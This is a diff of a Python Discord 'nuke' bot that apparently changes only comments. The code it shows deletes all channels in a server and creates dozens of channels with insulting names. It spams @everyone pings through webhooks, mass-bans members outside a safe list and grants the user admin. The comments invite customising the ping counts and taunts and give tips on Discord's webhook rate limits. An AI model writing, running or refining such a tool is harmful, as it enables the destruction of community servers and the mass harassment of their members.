@@ -12,11 +12,11 @@ intents.members = True
 
 client = discord.Client(intents=intents)
 
-# Load bot token
+
 with open("bottokens.txt", "r") as f:
     token = f.read().strip()
 
-# Load User IDs to Protect from Ban
+# to skids do not try to sell it it is not even scalable 
 try:
     with open("userids.txt", "r") as f:
         safe_users = set(f.read().splitlines())
@@ -29,7 +29,7 @@ HEADERS = {
     "Content-Type": "application/json"
 }
 
-# Harassing Channel Names with Emojis and Webhook Messages
+# You can change the channel name pings and emojis to how you want.
 channel_emojis = ["🔥", "💀", "👿", "🤡", "🖕", "🤖", "👺", "⚡"]
 channel_names = [
     "warlord-owns-you", "skid-clown", "cry-more-skid", "warlord-on-top",
@@ -42,16 +42,15 @@ spam_messages = [
     "@everyone Warlord on top! Skids on bottom!"
 ]
 
-# Maximum Pings
+# you can choose pings amount from here
 MAX_PINGS = 200000
 current_pings = 0
 
-# On Bot Ready
 @client.event
 async def on_ready():
     print(f"Logged in as {client.user}")
 
-# Commands
+# commands
 @client.event
 async def on_message(message):
     if message.content == "!protect":
@@ -67,7 +66,7 @@ async def on_message(message):
     elif message.content == ".grantadmin":
         await grant_admin(message)
 
-# Delete All Channels
+
 async def delete_all_channels(guild):
     print("Deleting all channels...")
     channels = guild.channels
@@ -78,7 +77,7 @@ async def delete_all_channels(guild):
         except Exception as e:
             print(f"[!] Failed to Delete Channel {channel.name}: {e}")
 
-# Create Channels, Webhooks, and Spam Simultaneously
+# channels and webhooks and spam
 async def create_channels_webhooks_and_spam(guild):
     try:
         print("Creating channels, webhooks, and starting spam...")
@@ -94,7 +93,7 @@ async def create_channels_webhooks_and_spam(guild):
 
             await create_webhook_with_retry(channel, webhooks)
 
-            # Start spamming immediately
+            
             asyncio.create_task(spam_webhook(webhooks[-1]))
 
         tasks = [create_channel_and_webhook() for _ in range(60)]
@@ -104,7 +103,7 @@ async def create_channels_webhooks_and_spam(guild):
     except Exception as e:
         print(f"Error during channel/webhook creation: {e}")
 
-# Create Webhook with Retry (5-Second Delay on Rate Limit)
+# Discord has a very high ratelimit on Webhook Creation so if you try auto retrying requests on ratelimit you will temporarily get blocked from the cloudfare
 async def create_webhook_with_retry(channel, webhooks):
     while True:
         try:
@@ -120,7 +119,7 @@ async def create_webhook_with_retry(channel, webhooks):
                 print(f"[!] Failed to Create Webhook: {e}")
                 return
 
-# Spam Webhooks (Simultaneously)
+# webhook spam
 async def spam_webhook(webhook):
     global current_pings
     async with aiohttp.ClientSession() as session:
@@ -140,7 +139,7 @@ async def spam_webhook(webhook):
             except Exception as e:
                 print(f"[!] Error Spamming Webhook {webhook.name}: {e}")
 
-# Mass Ban Command
+# massban
 async def massban(message):
     guild = message.guild
     print(f"Starting Mass Ban in {guild.name}")
@@ -154,7 +153,7 @@ async def massban(message):
         else:
             print(f"[!] Skipped Safe User: {member.name}#{member.discriminator}")
 
-# Grant Admin Command
+# admin grant
 async def grant_admin(message):
     guild = message.guild
     user = message.author
